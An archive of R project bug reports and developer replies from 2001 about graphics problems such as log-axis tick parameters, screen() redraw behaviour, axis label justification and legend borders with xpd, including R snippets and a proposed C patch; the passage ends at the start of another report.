Date: 31 Jan 2001 20:12:41 -0500
In-Reply-To: Prof Brian D Ripley's message of "Tue, 30 Jan 2001 07:39:25 +0000 (GMT)"
Message-ID: <px7l3bcik6.fsf@infiniti.ece.cmu.edu>
Lines: 81
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Prof Brian D Ripley <ripley@stats.ox.ac.uk> writes:

> [I have abbreviated the subject as jitterbug has been having probems
> with long subjects.]
> 
> The issue here is that one cannot mix log/non-log axes in the calls to
> screen(), as the appropriate par() parameter is read-only, but the
> meaning of yaxp depends on it.  But beyond that you can't set
> x/yaxp for log axes.
> 
> You should be able to do this: you can in the S original.
> 
> A simpler version:
> 
> plot (1:2, 1:2, log="y", main="1")
> zz <- par("yaxp")
> zz
> [1]  1  2 -5
> par(yaxp=zz)
> Error in par(yaxp = zz) : invalid value specified for graphics parameter
> "yaxp".
> 
> So you can't reset the yaxp parameter to what it is reported as!
[snip]

The code in main/par.c ignores the value of xlog (or ylog) when
setting xaxp (or yaxp).  Right now you have in Specify (and Specify2):

... else if (streql(what, "xaxp")) {
	value = coerceVector(value, REALSXP);
	lengthCheck(what, value, 3);
	naRealCheck(REAL(value)[0], what);
	naRealCheck(REAL(value)[1], what);
        posIntCheck((int) (REAL(value)[2]), what);

Shouldn't that be something like:

... else if (streql(what, "xaxp")) {
	value = coerceVector(value, REALSXP);
	lengthCheck(what, value, 3);
	naRealCheck(REAL(value)[0], what);
	naRealCheck(REAL(value)[1], what);
        if (dd->gp.xlog)
            logAxpCheck((int) (REAL(value)[2]), what);
        else
            posIntCheck((int) (REAL(value)[2]), what);

Where logAxpCheck is suitably defined as:

static void logAxpCheck(int x, char *s)
{
    if (x == NA_INTEGER || x == 0 || x > 4)
	par_error(s);
}

since only values < 0 or the values 1, 2, 3 are allowed?


> Additional bug: the meaning of x/yaxp for log axes is not defined
> in help(par).

excerpt from help(par):

    xaxp: A vector of the form `c(x1, x2, n)' giving the coordinates
          of the extreme tick marks and the number of intervals
          between tick-marks.

Could you add:

          The value of n must be positive for linear scale axes.  For
          logarithmic scale axes n must be either negative (then there
          will be (1-n) ticks at a linear distance) or one of 1, 2, or
          3 where n then indicates the number of ticks per decade.

similar for yaxp?  What am I missing?
Regards,
  -tom

-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204

==> 831.audit <==
Wed Feb  7 08:51:14 2001	ripley	moved from incoming to Graphics
Thu Apr 26 12:13:40 2001	pd	changed notes
Thu Apr 26 12:13:40 2001	pd	foobar
Thu Jun  7 19:13:15 2001	thomas	changed notes
Thu Jun  7 19:13:15 2001	thomas	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 837 *
Subject: screen doesn't handle redrawing properly
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 01 Feb 2001 14:20:52 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 837 <==
From tov@ece.cmu.edu  Thu Feb  1 20:20:40 2001
Received: from infiniti.ece.cmu.edu (INFINITI.ECE.CMU.EDU [128.2.133.84])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA08721
	for <r-bugs@biostat.ku.dk>; Thu, 1 Feb 2001 20:20:39 +0100 (MET)
Received: (from tov@localhost) by infiniti.ece.cmu.edu (AIX4.3/UCB 8.8.8/8.8.8) id OAA30464; Thu, 1 Feb 2001 14:20:52 -0500
X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: r-bugs@biostat.ku.dk
Cc: Thomas Vogels <tov@ece.cmu.edu>
Subject: screen doesn't handle redrawing properly
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 01 Feb 2001 14:20:52 -0500
Message-ID: <pxitmub46j.fsf@infiniti.ece.cmu.edu>
Lines: 74
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Hi.  As far as I understand it, there is a list of graphic primitives
stored for a device.  So for example, when I iconify/deiconify an X11
window, the plot will be redrawn.  Now screen (split.screen and
friends) appear not to handle this list properly, the list is reset or
not reset at odd times.  The commands below will show clearly what I
mean.  There are two effects:

  - After splitting the device real estate into two screens, I can
    plot on these screens, alternating between them.  When I then
    touch the window to force a redraw, *all* the plots are redrawn,
    not just the last (and visible) ones.
    [This happens when the X server runs on AIX, R runs on AIX or Sun.]

  - Again, after splitting, plotting on one screen can affect the
    other screen.  I.e. plot(...); plot (...) on the left screen can
    erase the *right* screen.
    [This happens for all platforms I have access to, AIX, Linux, Sun.]

The first effect may be due to a bad interaction with the X server,
but the second effect is surely not desirable, is it?  Am I mis-using
'screen' here?

R> split.screen (c(1,2))
[1] 1 2
R> # Draw 10000 points to make the effect obvious
R> screen (1)
R> plot (1:10000, 1:10000, main="1")
R> screen (2)
R> plot (1:10000, 1:10000, main="2")
R> # Ok, go back to screen 1, draw plots 3 and 4
R> screen (1)
R> plot (1:10000, 10000:1, main="3")
R> screen (2)
R> plot (1:10000, 10000:1, main="4")
R> 
R> ########################################
R> # NOW lower/raise window, do something to force device to redraw itself.
R> # You'll see again plot 1 (!), 2 (!), 3, and 4.  Why 1 and 2?
R> ########################################
R> 
R> # Here's how to erase screen 2 from screen 1 (!)
R> screen (1)
R> plot (1:10, 1:10, main="3a")
R> ########################################
R> # The following plot will erase screen 2
R> ########################################
R> plot (1:10, 1:10, main="3b")
R> 
R> # The good news is that this resets the list of graphic ops:
R> screen (2)
R> plot (1:10, 1:10, main="4")
R> # Now if you touch the window, you'll see only plot 3b and 4.

Regards,
  -tom

R> R.version
         _                   
platform sparc-sun-solaris2.7
arch     sparc               
os       solaris2.7          
system   sparc, solaris2.7   
status   Patched             
major    1                   
minor    2.1                 
year     2001                
month    01                  
day      31                  
language R                   

-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204


==> 837.audit <==
Wed Feb  7 08:51:14 2001	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 887 *
Subject: axis(adj=anything) has no effect
From: jhallman@frb.gov
Date: Wed, 28 Mar 2001 20:51:05 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 887 <==
From jhallman@frb.gov  Wed Mar 28 20:51:06 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA23265
	for <R-bugs@biostat.ku.dk>; Wed, 28 Mar 2001 20:51:05 +0200 (MET DST)
Date: Wed, 28 Mar 2001 20:51:05 +0200 (MET DST)
From: jhallman@frb.gov
Message-Id: <200103281851.UAA23265@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: axis(adj=anything) has no effect

Full_Name: Jeff Hallman
Version: 1.2.2
OS: SunOS5.6
Submission from: (NULL) (132.200.32.33)


Giving an adj argument to axis() seems to have no effect.  In Splus, adj = 0 
left-justifies the labels under the ticks, adj = 1 right justifies them, and 
numbers in between can also be used.  I like to use adj = 0.9 to get something
that looks like this:

-----------+-----------+-----------+------------+---------
        1980        1981        1982         1983

as an axis for a plot of monthly time series data.



==> 887.audit <==
Sat Apr  7 10:29:17 2001	ripley	moved from incoming to Graphics

==> 887.followup.1 <==
From paul@stat.auckland.ac.nz  Tue Jun 19 06:05:35 2001
Received: from mailhost.auckland.ac.nz (mailhost.auckland.ac.nz [130.216.191.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA16140
	for <R-bugs@biostat.ku.dk>; Tue, 19 Jun 2001 06:05:33 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id QAA00412;
	Tue, 19 Jun 2001 16:05:26 +1200 (NZST)
Received: from murrell (murrell.stat.auckland.ac.nz [130.216.93.23])
	by stat1.stat.auckland.ac.nz (8.9.3+Sun/8.8.8) with SMTP id QAA24826;
	Tue, 19 Jun 2001 16:05:25 +1200 (NZST)
Message-ID: <020401c0f877$becbd540$175dd882@stat.auckland.ac.nz>
From: "Paul Murrell" <paul@stat.auckland.ac.nz>
To: <r-core@r-project.org>
Cc: <R-bugs@biostat.ku.dk>
Subject: Re: axis(adj=anything) has no effect (PR#887)
Date: Tue, 19 Jun 2001 16:24:35 +1200
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4522.1200
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200

Hi

----Bug summary:----
Giving an adj argument to axis() seems to have no effect.  In Splus, adj = 0
left-justifies the labels under the ticks, adj = 1 right justifies them, and
numbers in between can also be used.  I like to use adj = 0.9 to get
something
that looks like this:

-----------+-----------+-----------+------------+---------
        1980        1981        1982         1983

as an axis for a plot of monthly time series data.
----Bug summary:----


Are missing features bugs or wish-list items ?

Paul


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 943 *
Subject: legend() with xpd=T; omission of initial plot character
From: John Maindonald <john.maindonald@anu.edu.au>
Date: Sun, 20 May 2001 10:35:16 +1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 943 <==
From postmaster@franz.stat.wisc.edu  Sun May 20 02:32:40 2001
Received: from franz.stat.wisc.edu (franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA02494
	for <r-bugs@biostat.ku.dk>; Sun, 20 May 2001 02:32:39 +0200 (MET DST)
Received: from mail.anu.edu.au (really [150.203.2.7]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m151H95-000JH8C@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Sat, 19 May 2001 19:32:31 -0500 (CDT) 
Received: from anugpo.anu.edu.au (anugpo.anu.edu.au [150.203.2.6])
	by mail.anu.edu.au (8.9.3/8.9.3) with ESMTP id KAA18515
	for <r-bugs@r-project.org>; Sun, 20 May 2001 10:32:27 +1000 (EST)
Received: from soda.anu.edu.au (soda.anu.edu.au [150.203.33.17])
	by anugpo.anu.edu.au (8.9.3+Sun/8.9.3) with ESMTP id KAA22405
	for <r-bugs@r-project.org>; Sun, 20 May 2001 10:32:27 +1000 (EST)
Message-Id: <5.0.2.1.1.20010520103337.00ac8b10@pophost.anu.edu.au>
X-Sender: u9801539@pophost.anu.edu.au (Unverified)
X-Mailer: QUALCOMM Windows Eudora Version 5.0.2
Date: Sun, 20 May 2001 10:35:16 +1000
To: r-bugs@r-project.org
From: John Maindonald <john.maindonald@anu.edu.au>
Subject: legend() with xpd=T; omission of initial plot character
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"; format=flowed


In the following:

plot(0:1, 0:1)
legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

the first plot character is omitted when plotting to
the screen.

I obtained the same behaviour when placing a legend
in the margin following use of pairs()

-please do not edit the information below--

Version:
  platform = i386-pc-mingw32
  arch = x86
  os = Win32
  system = x86, Win32
  status =
  major = 1
  minor = 2.3
  year = 2001
  month = 04
  day = 26
  language = R

Windows 98 SE 4.10 (build 2222)  A

Search Path:
  .GlobalEnv, package:ctest, Autoloads, package:base
John Maindonald               email : john.maindonald@anu.edu.au
Statistical Consulting Unit,  phone : (6125)3998
c/o CMA, SMS,                 fax   : (6125)5549
John Dedman Mathematical Sciences Building
Australian National University
Canberra ACT 0200
Australia


==> 943.reply.1 <==
From: paul@stat.auckland.ac.nz
To: r-core@r-project.org
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
Date: Tue Jun 19 05:58:40 2001
CC: r-bugs@r-project.org; john.maindonald@anu.edu.au

Hi

Bug summary:----
par(xpd=T)
plot(0:1, 0:1)
legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

the first plot character is omitted when plotting to
the screen.
Bug summary:----

I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
example above, the border around the legend is not drawn.

This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE).  This
is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
default.  arrows(xpd=FALSE) has the same problem as rect().  

I propose modifying rect() and arrows() to use par(xpd) by default like text()
and polygon().  There will, as usual, be a small risk that someone's code will
produce different output after this change, but this risk should be pretty
small.

Any objections ... ?

Paul

==> 943.followup.1 <==
From postmaster@franz.stat.wisc.edu  Tue Jun 19 05:56:22 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA16092
	for <r-bugs@biostat.ku.dk>; Tue, 19 Jun 2001 05:56:21 +0200 (MET DST)
Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15CCch-000JGhC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Mon, 18 Jun 2001 22:56:15 -0500 (CDT) 
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA16087;
	Tue, 19 Jun 2001 05:55:27 +0200 (MET DST)
From: paul@stat.auckland.ac.nz
Received: from blueberry.kubism.ku.dk (blueberry.kubism.ku.dk [130.225.108.193])
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) with ESMTP id FAA32381;
	Tue, 19 Jun 2001 05:58:35 +0200
Date: Tue, 19 Jun 2001 05:58:35 +0200
Message-Id: <200106190358.FAA32381@blueberry.kubism.ku.dk>
To: r-core@r-project.org
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
CC: r-bugs@r-project.org;john.maindonald@anu.edu.au;;;
X-Loop: R-bugs@biostat.ku.dk

Hi

Bug summary:----
par(xpd=T)
plot(0:1, 0:1)
legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

the first plot character is omitted when plotting to
the screen.
Bug summary:----

I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
example above, the border around the legend is not drawn.

This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE).  This
is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
default.  arrows(xpd=FALSE) has the same problem as rect().  

I propose modifying rect() and arrows() to use par(xpd) by default like text()
and polygon().  There will, as usual, be a small risk that someone's code will
produce different output after this change, but this risk should be pretty
small.

Any objections ... ?

Paul


==> 943.reply.2 <==
From postmaster@franz.stat.wisc.edu  Tue Jun 19 08:43:07 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA16819
	for <r-bugs@biostat.ku.dk>; Tue, 19 Jun 2001 08:43:07 +0200 (MET DST)
Received: from stat.math.ethz.ch (really [129.132.58.23]) by franz.stat.wisc.edu
	via smail with esmtp (ident daemon using rfc1413)
	id <m15CFDy-000JJWC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Tue, 19 Jun 2001 01:42:54 -0500 (CDT) 
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id IAA02705;
	Tue, 19 Jun 2001 08:42:52 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000eE; Tue Jun 19 08:42:50 2001
Received: (maechler@localhost) by lynne.ethz.ch (8.9.3/D-MATH-client) id IAA08111; Tue, 19 Jun 2001 08:42:50 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15150.62570.490993.741070@gargle.gargle.HOWL>
Date: Tue, 19 Jun 2001 08:42:50 +0200
To: paul@stat.auckland.ac.nz
Cc: r-bugs@r-project.org, john.maindonald@anu.edu.au
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
In-Reply-To: <200106190358.FAA32381@blueberry.kubism.ku.dk>
References: <200106190358.FAA32381@blueberry.kubism.ku.dk>
X-Mailer: VM 6.92 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "Paul" == Paul Murrell <paul@stat.auckland.ac.nz> writes:

    Paul> Hi
    Paul> Bug summary:----
    Paul> par(xpd=T)
    Paul> plot(0:1, 0:1)
    Paul> legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))

    Paul> the first plot character is omitted when plotting to
    Paul> the screen.
    Paul> Bug summary:----

    Paul> I cannot reproduce this bug, BUT it did show up a bug in rect()
    Paul> -- in the example above, the border around the legend is not
    Paul> drawn.

Coincidence, I *did* look at that bug only yesterday.
My experience:
   I *could* reproduce the bug {X11(), Linux-386}, but only a few times. 
   Then, it didn't show anymore. Even restarting R wouldn't show it again.
   My ``explanation'' was that it might be (a bug) inside X11 / Window manager
   handling of things... ??


    Paul> This is because rect() ignores par(xpd).  The default is
    Paul> rect(xpd=FALSE).  This is at odds with text(xpd=NULL) and
    Paul> polygon(xpd=NULL) which use par(xpd) by default.
    Paul> arrows(xpd=FALSE) has the same problem as rect().

    Paul> I propose modifying rect() and arrows() to use par(xpd) by
    Paul> default like text() and polygon().  There will, as usual, be a
    Paul> small risk that someone's code will produce different output
    Paul> after this change, but this risk should be pretty small.

    Paul> Any objections ... ?

not at all, but please fix  abline(*) at the same time.
It doesn't obey xpd either (PR#750).

Martin

==> 943.reply.3 <==
From: paul murrell <R-bugs@biostat.ku.dk>
To: paul@stat.auckland.ac.nz
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
Date: Tue Jul 17 04:28:44 2001
CC: John Maindonald <john.maindonald@anu.edu.au>

Hi


> Bug summary:----
> par(xpd=T)
> plot(0:1, 0:1)
> legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))
> 
> the first plot character is omitted when plotting to
> the screen.
> Bug summary:----
> 
> I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
> example above, the border around the legend is not drawn.


Still can't reproduce original bug, so no progress there.


> This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE). 
This
> is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
> default.  arrows(xpd=FALSE) has the same problem as rect().  
> 
> I propose modifying rect() and arrows() to use par(xpd) by default like
text()
> and polygon().  There will, as usual, be a small risk that someone's code
will
> produce different output after this change, but this risk should be pretty
> small.


Both of these changes made now (for 1.3.1).  
The following code should demonstrate the bugs (in pre-1.3.1 R) and the fixes:

par(mfrow=c(2,1), xpd=FALSE)
plot(1:10)
plot(1:10)
# rect() and arrow() ignored par(xpd=)
rect(1, 9, 2, 20, col="red")
arrows(1.5, 20, 1.5, 10)
par(xpd=TRUE)
rect(3, 9, 4, 20, col="blue")
arrows(3.5, 20, 3.5, 10)
par(xpd=NA)
rect(5, 9, 6, 20, col="green")
arrows(5.5, 20, 5.5, 10)

Paul


==> 943.audit <==
Mon May 21 08:54:07 2001	ripley	moved from incoming to Graphics
Tue Jun 19 05:58:40 2001	paul	sent reply 1
Tue Jul 17 04:28:44 2001	paul	sent reply 3

==> 943.followup.2 <==
From MAILER-DAEMON  Tue Jul 17 04:21:22 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA16216
	for <R-bugs@biostat.ku.dk>; Tue, 17 Jul 2001 04:21:21 +0200 (MET DST)
Received: from localhost (localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) with internal id EAA21901;
	Tue, 17 Jul 2001 04:28:45 +0200
Date: Tue, 17 Jul 2001 04:28:45 +0200
From: Mail Delivery Subsystem <MAILER-DAEMON@pubhealth.ku.dk>
Message-Id: <200107170228.EAA21901@blueberry.kubism.ku.dk>
To: <R-bugs@biostat.ku.dk>
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status;
	boundary="EAA21901.995336925/blueberry.kubism.ku.dk"
Subject: Returned mail: User unknown
Auto-Submitted: auto-generated (failure)

This is a MIME-encapsulated message

--EAA21901.995336925/blueberry.kubism.ku.dk

The original message was received at Tue, 17 Jul 2001 04:28:44 +0200
from blueberry.kubism.ku.dk [130.225.108.193]

   ----- The following addresses had permanent fatal errors -----
<John>
    (expanded from: <John>)
<Maindonald>
    (expanded from: <Maindonald>)

   ----- Transcript of session follows -----
... while talking to mail.kubism.ku.dk.:
>>> RCPT To:<maindonald@mail.kubism.ku.dk>
<<< 550 <maindonald@mail.kubism.ku.dk>... User unknown
550 <Maindonald>... User unknown
>>> RCPT To:<john@mail.kubism.ku.dk>
<<< 550 <john@mail.kubism.ku.dk>... User unknown
550 <John>... User unknown

--EAA21901.995336925/blueberry.kubism.ku.dk
Content-Type: message/delivery-status

Reporting-MTA: dns; blueberry.kubism.ku.dk
Received-From-MTA: DNS; blueberry.kubism.ku.dk
Arrival-Date: Tue, 17 Jul 2001 04:28:44 +0200

Final-Recipient: RFC822; john@blueberry.kubism.ku.dk
X-Actual-Recipient: RFC822; john@mail.kubism.ku.dk
Action: failed
Status: 5.1.1
Remote-MTA: DNS; mail.kubism.ku.dk
Diagnostic-Code: SMTP; 550 <john@mail.kubism.ku.dk>... User unknown
Last-Attempt-Date: Tue, 17 Jul 2001 04:28:44 +0200

Final-Recipient: RFC822; maindonald@blueberry.kubism.ku.dk
X-Actual-Recipient: RFC822; maindonald@mail.kubism.ku.dk
Action: failed
Status: 5.1.1
Remote-MTA: DNS; mail.kubism.ku.dk
Diagnostic-Code: SMTP; 550 <maindonald@mail.kubism.ku.dk>... User unknown
Last-Attempt-Date: Tue, 17 Jul 2001 04:28:44 +0200

--EAA21901.995336925/blueberry.kubism.ku.dk
Content-Type: message/rfc822

Return-Path: <R-bugs@biostat.ku.dk>
Received: from blueberry.kubism.ku.dk (blueberry.kubism.ku.dk [130.225.108.193])
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) with ESMTP id EAA21899;
	Tue, 17 Jul 2001 04:28:44 +0200
Date: Tue, 17 Jul 2001 04:28:44 +0200
Message-Id: <200107170228.EAA21899@blueberry.kubism.ku.dk>
From: paul murrell <R-bugs@biostat.ku.dk>
To: paul@stat.auckland.ac.nz
Subject: Re: legend() with xpd=T; omission of initial plot character (PR#943)
CC: John Maindonald <john.maindonald@anu.edu.au>
X-Loop: R-bugs@biostat.ku.dk

Hi


> Bug summary:----
> par(xpd=T)
> plot(0:1, 0:1)
> legend(x=0, y=1.2, pch=c(1,2), legend=c("May","June"))
> 
> the first plot character is omitted when plotting to
> the screen.
> Bug summary:----
> 
> I cannot reproduce this bug, BUT it did show up a bug in rect() -- in the
> example above, the border around the legend is not drawn.


Still can't reproduce original bug, so no progress there.


> This is because rect() ignores par(xpd).  The default is rect(xpd=FALSE). 
This
> is at odds with text(xpd=NULL) and polygon(xpd=NULL) which use par(xpd) by
> default.  arrows(xpd=FALSE) has the same problem as rect().  
> 
> I propose modifying rect() and arrows() to use par(xpd) by default like
text()
> and polygon().  There will, as usual, be a small risk that someone's code
will
> produce different output after this change, but this risk should be pretty
> small.


Both of these changes made now (for 1.3.1).  
The following code should demonstrate the bugs (in pre-1.3.1 R) and the fixes:

par(mfrow=c(2,1), xpd=FALSE)
plot(1:10)
plot(1:10)
# rect() and arrow() ignored par(xpd=)
rect(1, 9, 2, 20, col="red")
arrows(1.5, 20, 1.5, 10)
par(xpd=TRUE)
rect(3, 9, 4, 20, col="blue")
arrows(3.5, 20, 3.5, 10)
par(xpd=NA)
rect(5, 9, 6, 20, col="green")
arrows(5.5, 20, 5.5, 10)

Paul



--EAA21901.995336925/blueberry.kubism.ku.dk--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 997 *
Subject:  las=1 with log axis 
From: Peter Dalgaard BSA <pd@pubhealth.ku.dk>
Date: Wed, 27 Jun 2001 11:54:06 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 997 <==
From postmaster@franz.stat.wisc.edu  Wed Jun 27 11:50:00 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA01987
	for <r-bugs@biostat.ku.dk>; Wed, 27 Jun 2001 11:49:59 +0200 (MET DST)
Received: from pubhealth.ku.dk (really [130.225.108.10]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m15FBxI-000JJjC@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Wed, 27 Jun 2001 04:49:52 -0500 (CDT) 
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA01969;
	Wed, 27 Jun 2001 11:49:40 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) id LAA25776;
	Wed, 27 Jun 2001 11:54:06 +0200
Date: Wed, 27 Jun 2001 11:54:06 +0200
From: Peter Dalgaard BSA <pd@pubhealth.ku.dk>
Message-Id: <200106270954.LAA25776@blueberry.kubism.ku.dk>
To: r-bugs@r-project.org
Subject:  las=1 with log axis 
Cc: pd@pubhealth.ku.dk

This just came in:

plot(c(0.1,100),log="y", las=1)

(Numbers and tick marks are unaligned)

Same thing with mtext(), try

mtext("x",2,at=0.1)
mtext("x",2,at=0.1,las=1)

--please do not edit the information below--

Version:
 platform = i586-pc-linux-gnu
 arch = i586
 os = linux-gnu
 system = i586, linux-gnu
 status = 
 major = 1
 minor = 3.0
 year = 2001
 month = 06
 day = 22
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 997.followup.1 <==
From paul@stat.auckland.ac.nz  Fri Jun 29 00:19:03 2001
Received: from mailhost.auckland.ac.nz (mailhost.auckland.ac.nz [130.216.1.4] (may be forged))
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id AAA21935;
	Fri, 29 Jun 2001 00:19:01 +0200 (MET DST)
Received: from stat1.stat.auckland.ac.nz (stat1.stat.auckland.ac.nz [130.216.93.1])
	by mailhost.auckland.ac.nz (8.9.2/8.9.2/8.9.2-ua) with ESMTP id KAA24932;
	Fri, 29 Jun 2001 10:18:52 +1200 (NZST)
Received: from murrell (murrell.stat.auckland.ac.nz [130.216.93.23])
	by stat1.stat.auckland.ac.nz (8.9.3+Sun/8.8.8) with SMTP id KAA25180;
	Fri, 29 Jun 2001 10:18:52 +1200 (NZST)
Message-ID: <00fc01c10023$19a40700$175dd882@stat.auckland.ac.nz>
From: "Paul Murrell" <paul@stat.auckland.ac.nz>
To: <pd@pubhealth.ku.dk>, <r-devel@stat.math.ethz.ch>
Cc: <R-bugs@biostat.ku.dk>
References: <200106270950.LAA01997@pubhealth.ku.dk>
Subject: Re: [Rd] las=1 with log axis (PR#997)
Date: Fri, 29 Jun 2001 10:38:49 +1200
MIME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 7bit
X-Priority: 3
X-MSMail-Priority: Normal
X-Mailer: Microsoft Outlook Express 5.50.4522.1200
X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1200

Hi


> This just came in:
>
> plot(c(0.1,100),log="y", las=1)
>
> (Numbers and tick marks are unaligned)
>
> Same thing with mtext(), try
>
> mtext("x",2,at=0.1)
> mtext("x",2,at=0.1,las=1)


This is related to bug #865, which I have discovered is a problem with some
of the very basic transformation code in R graphics (for transforming widths
or heights when there are log scales).  I have a fix for this particular
mtext() problem, but I'm still working on the more general transformation
bug.

Paul



==> 997.reply.1 <==
From: paul murrell <R-bugs@biostat.ku.dk>
To: pd@pubhealth.ku.dk
Subject: Re: las=1 with log axis (PR#997)
Date: Tue Jul 17 06:05:49 2001

Hi


> plot(c(0.1,100),log="y", las=1)
> 
> (Numbers and tick marks are unaligned)
> 
> Same thing with mtext(), try
> 
> mtext("x",2,at=0.1)
> mtext("x",2,at=0.1,las=1)


This is now fixed (which also fixes PR#865).
Also fixed for mtext() when side=1, log="x", and las=2 (and for corresponding
siutations on sides 3 and 4).
Also fixed for mtext() when text is an expression (i.e., mathematical
annotation).

Unfortunately, the problem goes pretty deep -- it is to do with transformation
of widths and heights to or from USER coordinates when the axis is logged. 
There are a couple of other places where this causes a problem:
(i) strwidth() and strheight() 
(ii) symbols()

I'm leaving this bug active until these other issues are resolved.

Paul


==> 997.audit <==
Sat Jun 30 08:57:44 2001	ripley	moved from incoming to Graphics
Tue Jul 17 06:05:49 2001	paul	sent reply 1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1045 *
Subject: Palette changes on redraw
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 08 Aug 2001 19:08:01 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1045 <==
From postmaster@franz.stat.wisc.edu  Wed Aug  8 19:07:59 2001
